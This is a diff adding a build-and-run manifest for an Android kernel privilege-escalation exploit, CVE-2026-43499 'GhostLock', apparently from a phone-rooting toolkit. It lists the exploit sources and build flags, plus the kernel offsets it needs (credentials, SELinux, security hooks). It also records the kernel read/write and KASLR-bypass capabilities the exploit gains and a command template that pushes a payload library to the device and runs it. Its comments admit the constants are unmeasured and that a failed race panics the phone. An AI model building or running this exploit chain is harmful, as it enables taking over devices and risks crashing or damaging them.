@@ -1,0 +1,170 @@
+# entry.ghostlock@5.10 — GhostLock entry, android13-5.10 variant.
+#
+# UNVERIFIED ON HARDWARE, but not unverified as to the bug. The fix rewrites
+# remove_waiter() in kernel/locking/rtmutex.c to take the task from
+# waiter->task; the tree this build names in its own uname (kernel/common @
+# 776d0a76f6aa) still clears current->pi_blocked_on and contains no
+# waiter_task at all -- character-for-character what panther's gbd23337e42e7
+# has, and panther is hardware-verified exploitable. So the bug is open here.
+#
+# What no one has done is RUN it. The route constants below came from the 6.1
+# raven header rather than from measurement, and a lost race panics the phone.
+# cves/cve-2026-43499-ghostlock/510-probe.sh checks the device-side
+# preconditions the source cannot speak for.
+#
+# It compiles the SAME sources as entry.ghostlock@6.1 -- src/61/*. That is the
+# finding, not a shortcut: the 5.10 deltas that looked like they needed a third
+# source set (no kmalloc-cg row, a shorter rt_mutex_waiter, configfs without
+# iter ops) all turned out to be target-header constants or stores that land in
+# a gap of our own buffer. See the comments in pipe.c, util.c and common.h.
+#
+# What is NOT derived and was inherited from the 6.1 raven header:
+# MAIN_TCP_ROUTE_DEFAULT, MAIN_TCP_PAYLOAD_DEFAULT, PSELECT_WAITER_WORD_SHIFT.
+# Those are route choices measured per flavour, and nobody has measured them
+# here.
+
+schema = 1
+kind   = "entry"
+id     = "entry.ghostlock@5.10"
+cve    = "CVE-2026-43499"
+kmi    = ["android13-5.10"]
+
+composed = true
+status   = "composed; DERIVED, NEVER RUN — the bug is open in this build's own tree (remove_waiter() unfixed, character-for-character as on panther) and the offsets come from its public OTA, but no android13-5.10 device has run this and MAIN_TCP_ROUTE_DEFAULT / MAIN_TCP_PAYLOAD_DEFAULT / PSELECT_WAITER_WORD_SHIFT were inherited from the 6.1 raven header rather than measured"
+
+[build]
+form    = "preload-so"
+entry   = "constructor"
+# Order is load-bearing (STT_FILE order + .rodata string-merge order).
+sources = [
+  "cves/cve-2026-43499-ghostlock/61/main.c",
+  "cves/cve-2026-43499-ghostlock/61/util.c",
+  "cves/cve-2026-43499-ghostlock/61/slide61.c",
+  "cves/kaslr/slide_tracefs.c",
+  "cves/cve-2026-43499-ghostlock/61/fops.c",
+  "cves/cve-2026-43499-ghostlock/61/pipe.c",
+  "cves/cve-2026-43499-ghostlock/61/root.c",
+  "cves/cve-2026-43499-ghostlock/61/preload.c",
+]
+# The 61/ include dir comes first, then the 6.6 dir, then cves/.  61/ has no
+# offset.h and no targets/, so offset.h and targets/<t>/target.h resolve through
+# those; the family header resolves through the including file's own directory.
+includes = ["cves/cve-2026-43499-ghostlock/61", "cves/cve-2026-43499-ghostlock", "cves"]
+depends  = ["cves/cve-2026-43499-ghostlock/61/common.h", "cves/cve-2026-43499-ghostlock/61/kernelsnitch/*.h"]
+defines  = ["APP_PAYLOAD=1"]
+# @OPT@ is substituted with `opt` below.  The app and release variants share one
+# flag list.
+cflags   = ["-fPIC", "@OPT@", "-Wall", "-Wextra", "-Wno-unused-parameter", "-Wno-sign-compare"]
+opt      = ["-O2", "-g0"]
+ldflags  = ["-shared", "-pthread"]
+output   = "cve-2026-43499-app"
+
+# The artifact runner/scripts/build-payloads.sh actually ships.
+[build.release]
+opt     = ["-Oz", "-g0", "-fno-unwind-tables", "-fno-asynchronous-unwind-tables",
+           "-ffunction-sections", "-fdata-sections"]
+ldflags = ["-shared", "-pthread", "-Wl,--gc-sections", "-Wl,--icf=all", "-s"]
+output  = "cve-2026-43499-app.release"
+
+[facts]
+header = "cves/targets/{target}/target.h"
+requires = [
+  "OFFSET_H", "BUILD_VARIANT_LABEL", "BUILD_FINGERPRINT",
+  "INIT_TASK", "INIT_TASK_OFF",
+  "ASHMEM_MISC_FOPS", "ASHMEM_MISC_FOPS_OFF", "ASHMEM_FOPS", "ASHMEM_IOCTL",
+  "KMALLOC_CACHES", "KMALLOC_CACHES_OFF",
+  "P0_PAGE_OFFSET", "P0_PHYS_OFFSET", "P0_KERNEL_PHYS_LOAD", "KIMAGE_TEXT_BASE",
+  "PIPE_BUFFER_SIZE", "PIPE_BUFFER_SLOTS",
+  "SLIDE_INIT_TASK_IMAGE", "SLIDE_LOGGERS_0_1_IMAGE", "SLIDE_SYSCTL_BOOTID_IMAGE",
+  "TASK_CRED_OFF", "TASK_REAL_CRED_OFF", "CRED_UID_OFF",
+  "SELINUX_ENFORCING", "SECURITY_HOOK_HEADS",
+  # The 6.1 discriminators; 61/common.h #ifndef-guards all seven, so
+  # requiring them here rejects a 6.6 header.
+  "MM_STRUCT_SZ", "KMALLOC_CGROUP_TYPE", "KMALLOC_CACHE_TYPES",
+  "KMALLOC_PIPE_INDEX", "PSELECT_WAITER_WORD_SHIFT",
+  "MAIN_TCP_ROUTE_DEFAULT", "MAIN_TCP_PAYLOAD_DEFAULT",
+]
+forbids = []
+# Present on akita only; it is the one device that would say 8.  Optional:
+# absence falls back to 61/common.h:73.
+optional = ["KSNITCH_COLLISIONS", "SLIDE_LOGGER_PARENT"]
+
+[properties]
+retry_safe  = true
+panic_risk  = { pre_slide = "high", post_slide = "none" }
+destructive = ["slide_logger_parent_slot", "ashmem_miscs[0].fops"]
+restores    = ["repair_logger_slot", "restore_fops_ptr_and_owner"]
+provides    = ["CAP_SLIDE", "CAP_KRW_C"]
+requires_caps = []
+retains     = ["CAP_KRW_C"]
+
+# The de-facto [tunables] block: read at runtime by 61/util.c env_flag()/
+# env_int_range().  Listed so a later step can lift them into the recipe.
+[tunables]
+env = [
+  "MAIN_TCP_ROUTE", "MAIN_TCP_PAYLOAD", "MAIN_TCP_ROUTE_ATTEMPTS",
+  "MAIN_TCP_ROUTE_DELAY_USEC", "MAIN_TCP_ROUTE_ARM_SEQ",
+  "MAIN_TCP_PAGE_ATTEMPTS", "MAIN_TCP_CFI_ATTEMPTS_PER_PAGE",
+  "MAIN_TCP_POST_GETSOCKOPT_HOLD", "MAIN_TCP_RETRY_PIPE_GEOM",
+  "MAIN_TCP_TASK_SLIDE_INIT", "MAIN_TCP_LOG_EACH",
+  "PSELECT_ROUTE_DELAY_USEC", "PSELECT_CONSUMER_NICE_VALUE",
+  "PSELECT_ACCEPT_NONREADY_CFI",
+  "KASLR_BASE", "RMG_CLIENT_UID", "CVE43499_ROOT_HELPER",
+]
+
+# ---------------------------------------------------------------------------
+# The runner contract — runner/README.md, "Foreign-chain contract"
+# ---------------------------------------------------------------------------
+# The four tables below restate runner/lib/exploit.sh's built-in defaults as
+# data.  ./pixel-ksu-root with no --recipe reads no manifest; `--recipe
+# ghostlock` reads this block.
+
+[invoke]
+# A .so dlopen'ed by `cve-helper --run-payload`
+# (cves/cve-2026-43499-ghostlock/su_daemon.c:975-1026, dispatched at :1028).
+kind = "helper-preload"
+
+# The payload the runner pushes is a prebuilt .so chosen out of
+# artifacts/exploits/ by runner/lib/select.sh from data/targets.json — a device
+# can resolve to a payload built for a different codename on the same kernel.
+artifact_source = "runner"
+dest = "/data/local/tmp/exploit-payload.so"
+mode = "755"
+
+# Generated from the _INVOKE_TMPL_DEFAULT literal in runner/lib/exploit.sh.
+command = "cd @DEV_TMP@; @KASLR_ENV@RMG_CLIENT_UID=@CLIENT_UID@ RMG_APP_UID=@APP_UID@        @DEV_HELPER@ --run-payload @DEV_PAYLOAD@ @DEV_HELPER@ @DEV_LOG@ >/dev/null 2>&1"
+
+# A base cached for the current boot is replayed through @KASLR_ENV@
+# (cves/cve-2026-43499-ghostlock/61/main.c:275-286).
+accepts_base = true
+
+# The default MARK_* set of runner/lib/exploit.sh, as data.  The live classes for
+# GhostLock are PANIC, REFUSED, PASS, MISS and PARKED; the classifier is driven
+# by these patterns.
+[markers]
+pass         = 'slide-kaslr(-tracefs)?-ok pid=[0-9]+ base=[0-9a-f]+'
+gate_fail    = '[A-Z][A-Z0-9_]*_GATE_FAIL'
+restore_pass = '[A-Z][A-Z0-9_]*_RESTORE_PASS'
+restore_bad  = '[A-Z][A-Z0-9_]*_(RESTORE_NOT_PROVEN|RESTORE_UNREACHABLE|RESTORE_FAIL)'
+# Declared so the kill gate stays correct.  Absent, a deadline parks.
+heartbeat    = '[A-Z][A-Z0-9_]*_HEARTBEAT[[:space:]]+seq=[0-9]+'
+# The route summary discriminates "reached root" from "did not"; the count is
+# cfi-miss LINES, one per page that took a miss.
+diag         = '(tcp|pselect) route done=[0-9]+[^\n]*'
+diag_count   = 'cfi misses=[0-9]+'
+
+# Empty: cve-helper's early bails return `errno ? errno : <fixed>`
+# (cves/cve-2026-43499-ghostlock/su_daemon.c:1000-1010), so no exit status of
+# this loader carries an outcome.
+[exit_map]
+
+# The KASLR base, from the `pass` marker above.
+[provides]
+caps  = ["CAP_SLIDE", "CAP_KRW_C"]
+field = 'base=[0-9a-f]+'
+label = "base"
+
+# Setup, run before each shot. GhostLock's reclaim race is far easier on a
+# freshly booted device, so its one setup step is a reboot to a clean boot.
+[[setup]]
+reboot = true
